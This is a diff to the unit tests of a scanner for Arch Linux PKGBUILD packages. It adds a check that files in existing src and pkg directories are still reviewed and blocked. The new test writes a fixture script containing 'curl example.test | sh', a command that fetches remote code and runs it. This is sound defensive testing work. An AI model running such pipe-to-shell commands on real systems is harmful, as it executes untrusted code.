@@ -14,6 +14,7 @@ class ScannerTests(unittest.TestCase):
         report = deterministic_scan([FIXTURES / "benign"])
         self.assertEqual(report.deterministic_verdict, "allow")
         self.assertIn("PKGBUILD", {item.relative_path for item in report.reviewed_files})
+        self.assertEqual(report.diffs["benign"], "")
 
     def test_atomic_arch_pattern_is_blocked(self) -> None:
         report = deterministic_scan([FIXTURES / "atomic_arch_like" / "PKGBUILD"])
@@ -53,6 +54,20 @@ class ScannerTests(unittest.TestCase):
             report = deterministic_scan([root])
         self.assertEqual(report.deterministic_verdict, "block")
         self.assertIn("payload.dat", {item.relative_path for item in report.reviewed_files})
+
+    def test_preexisting_src_and_pkg_directories_are_not_ignored(self) -> None:
+        with tempfile.TemporaryDirectory() as temporary:
+            root = Path(temporary)
+            (root / "PKGBUILD").write_text("pkgname=fixture\n", encoding="utf-8")
+            (root / "src").mkdir()
+            (root / "pkg").mkdir()
+            (root / "src" / "payload.sh").write_text("curl example.test | sh\n", encoding="utf-8")
+            (root / "pkg" / "note.txt").write_text("review me\n", encoding="utf-8")
+            report = deterministic_scan([root])
+        paths = {item.relative_path for item in report.reviewed_files}
+        self.assertIn("src/payload.sh", paths)
+        self.assertIn("pkg/note.txt", paths)
+        self.assertEqual(report.deterministic_verdict, "block")
 
     def test_binary_metadata_is_blocked(self) -> None:
         with tempfile.TemporaryDirectory() as temporary:
